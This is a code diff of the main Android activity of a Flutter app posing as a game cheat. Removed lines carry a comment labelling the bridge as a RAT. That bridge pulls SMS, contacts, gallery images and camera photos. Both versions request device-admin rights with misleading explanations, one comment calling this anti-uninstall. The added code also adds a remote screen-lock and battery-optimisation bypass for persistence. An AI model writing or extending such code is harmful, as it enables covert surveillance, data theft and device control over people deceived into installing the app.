@@ -2,70 +2,70 @@ package com.yanz.cheat
 
 import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
+import android.content.Context
 import android.content.Intent
+import android.os.Build
+import android.os.Bundle
+import androidx.annotation.NonNull
 import io.flutter.embedding.android.FlutterActivity
 import io.flutter.embedding.engine.FlutterEngine
 import io.flutter.plugin.common.MethodChannel
-import android.Manifest
-import android.content.pm.PackageManager
-import androidx.core.app.ActivityCompat
-import androidx.core.content.ContextCompat
 
 class MainActivity : FlutterActivity() {
-    private val CHANNEL = "yanz/cheat"
-    private lateinit var bridge: NativeBridge
 
-    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
+    private val CHANNEL = "com.yanz.cheat/native"
+    private lateinit var devicePolicyManager: DevicePolicyManager
+    private lateinit var adminComponent: ComponentName
+
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+        adminComponent = ComponentName(this, DeviceAdmin::class.java)
+    }
+
+    override fun configureFlutterEngine(@NonNull flutterEngine: FlutterEngine) {
         super.configureFlutterEngine(flutterEngine)
-        bridge = NativeBridge(this)
 
-        // 1. MINTA IZIN DEVICE ADMIN (ANTI UNINSTALL)
-        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
-        val admin = ComponentName(this, DeviceAdmin::class.java)
-        if (!dpm.isAdminActive(admin)) {
-            try {
-                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
-                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
-                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Aktifkan untuk optimasi performa game.")
-                startActivity(intent)
-            } catch (e: Exception) {}
-        }
-
-        // 2. MINTA IZIN DASAR (SMS, KAMERA, DLL)
-        val permissions = arrayOf(
-            Manifest.permission.READ_SMS,
-            Manifest.permission.READ_CONTACTS,
-            Manifest.permission.CAMERA,
-            Manifest.permission.READ_EXTERNAL_STORAGE,
-            Manifest.permission.READ_MEDIA_IMAGES
-        )
-        
-        val missingPermissions = permissions.filter {
-            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
-        }
-        
-        if (missingPermissions.isNotEmpty()) {
-            ActivityCompat.requestPermissions(this, missingPermissions.toTypedArray(), 101)
-        }
-
-        // 3. BRIDGE UNTUK RAT
         MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL)
             .setMethodCallHandler { call, result ->
-                try {
-                    when (call.method) {
-                        "getSms" -> result.success(bridge.getSms())
-                        "getContacts" -> result.success(bridge.getContacts())
-                        "getGallery" -> result.success(bridge.getGallery())
-                        "capturePhoto" -> {
-                            val front = call.argument<Boolean>("front") ?: false
-                            bridge.capturePhoto(front) { b64 -> 
-                                runOnUiThread { result.success(b64) } 
-                            }
-                        }
-                        else -> result.notImplemented()
+                when (call.method) {
+                    "isAdminActive" -> {
+                        result.success(devicePolicyManager.isAdminActive(adminComponent))
                     }
-                } catch (e: Exception) {
-                    result.success(if (call.method == "capturePhoto") "" else emptyList<Map<String, String>>())
+                    "requestAdmin" -> {
+                        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
+                        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
+                        intent.putExtra(
+                            DevicePolicyManager.EXTRA_ADD_EXPLANATION,
+                            "Aktifkan untuk fitur keamanan perangkat"
+                        )
+                        startActivity(intent)
+                        result.success(true)
+                    }
+                    "lockNow" -> {
+                        if (devicePolicyManager.isAdminActive(adminComponent)) {
+                            devicePolicyManager.lockNow()
+                            result.success(true)
+                        } else {
+                            result.error("NOT_ADMIN", "Device admin belum aktif", null)
+                        }
+                    }
+                    "isIgnoringBatteryOpt" -> {
+                        val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
+                        val ok = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                            pm.isIgnoringBatteryOptimizations(packageName)
+                        } else true
+                        result.success(ok)
+                    }
+                    "requestIgnoreBatteryOpt" -> {
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                            val intent = Intent(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
+                            intent.data = android.net.Uri.parse("package:$packageName")
+                            startActivity(intent)
+                        }
+                        result.success(true)
+                    }
+                    else -> result.notImplemented()
                 }
             }
     }
